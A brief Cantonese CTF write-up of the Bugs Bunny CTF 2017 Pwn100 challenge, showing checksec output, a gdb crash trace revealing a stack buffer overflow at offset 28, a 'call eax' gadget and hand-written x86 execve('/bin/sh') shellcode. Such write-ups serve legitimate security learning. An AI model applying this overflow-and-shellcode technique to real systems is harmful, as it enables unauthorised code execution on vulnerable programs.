# Bugsbunnyctf Pwn100

呢題其實唔難,不過比賽個陣炒左shellcode, 睇返writeup原來要自己打shellcode ༼☯﹏☯༽

checksec 

冇NX冇canary

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

有bufferoverflow vulnerability

ret 係input+28之後

input 係eax到

```
────────────────────────────────── Registers ───────────────────────────────────
EAX: 0xffffd1f0 ('A' <repeats 32 times>)
EBX: 0x0 
ECX: 0xfbad2288 
EDX: 0xf7fad87c --> 0x0 
ESI: 0x1 
EDI: 0xf7fac000 --> 0x1b2db0 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd210 --> 0x0 
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)

Legend: code, data, rodata, heap, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$ 
````

ROPgadget:

```
0x08048386 : call eax
```


shellcode:


```x86
xor eax,eax
xor ecx,ecx
xor edx,edx
xor esi,esi
mov eax,0x0b
lea ebx,[esp-8]
int 0x80
/bin/sh\x00

```

Sad~~~~~

# Reference

1.http://sw1ss.team/bugs_bunny_ctf_2k17/2017/07/31/bugs_bunny_ctf_2k17-pwn100/

